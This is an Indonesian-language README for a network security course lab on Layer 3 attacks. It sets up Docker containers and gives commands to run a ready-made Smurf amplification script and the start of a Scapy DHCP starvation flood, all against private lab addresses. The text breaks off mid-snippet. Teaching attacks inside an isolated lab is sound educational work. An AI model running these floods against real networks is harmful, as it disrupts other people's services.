# 🌐 Pertemuan 5: L3 Security Lab (IP/ICMP Attacks)

Lab environment untuk praktik ICMP attacks, IP spoofing, DHCP starvation, dan network reconnaissance di Layer 3.

---

## 🚀 Quick Start

### Prerequisites
- Docker dan Docker Compose terinstall
- Repository di-clone dari GitHub
- 4GB RAM available
- ~2GB disk space

### Clone Repository
```bash
git clone https://github.com/Muhammad-Ikhwan-Fathulloh/Network-Security-Course-Bank.git
cd Network-Security-Course-Bank
```

### Jalankan Lab
```bash
# Go to Labs folder (centralized docker configs)
cd Labs

# Start Pertemuan 5 lab
docker-compose -f docker-compose-p5.yml up -d

# Verifikasi (should show 3 containers)
docker-compose -f docker-compose-p5.yml ps

# Access attacker container
docker-compose -f docker-compose-p5.yml exec attacker-l3 bash
```

### Cleanup
```bash
docker-compose -f docker-compose-p5.yml down
```

---

## 📋 Lab Structure

```
Labs/
├── docker-compose-p5.yml    # Config for Pertemuan 5
├── README.md
└── QUICK_REFERENCE.md

Pertemuan5/
├── README.md (this file)
├── INDEX.md
├── scripts/smurf_attack.py  # Ready-to-use script
├── captures/
└── configs/
```

---

## 🐳 Container Services

| Container | IP | Role |
|-----------|----|----|
| attacker-l3 | 192.168.50.2 | Kali Linux attacker |
| target-l3 | 192.168.50.3 | Vulnerable Ubuntu target |
| monitor-l3 | 192.168.50.5 | Monitoring (tcpdump) |

---

## 📖 Lab Workflow

### Multi-Terminal Setup (3 terminals)

**Terminal 1: Monitor Network**
```bash
docker-compose -f docker-compose-p5.yml exec monitor-l3 bash
tcpdump -i eth0 -n icmp
```

**Terminal 2: Attacker**
```bash
docker-compose -f docker-compose-p5.yml exec attacker-l3 bash

# Install Scapy if needed
apt-get update && apt-get install -y python3-scapy

# Run SMURF attack
python3 ../Pertemuan5/scripts/smurf_attack.py 192.168.50.3 192.168.50.255 10
```

**Terminal 3: Target**
```bash
docker-compose -f docker-compose-p5.yml exec target-l3 bash
watch -n 1 'netstat -an | wc -l'
```

---

## 🔧 Pre-made Scripts

**SMURF Attack (Ready to use):**
```bash
python3 Pertemuan5/scripts/smurf_attack.py <target_ip> <broadcast_ip> [duration] [interval]

# Example:
python3 Pertemuan5/scripts/smurf_attack.py 192.168.50.3 192.168.50.255 10 0.1
```

---

## 🔧 Common Attacks

### DHCP Starvation
```bash
python3 << 'EOF'
from scapy.all import *
for i in range(100):
    pkt = IP(dst="192.168.50.4")/UDP(dport=67)/DHCP()
    send(pkt, verbose=0)
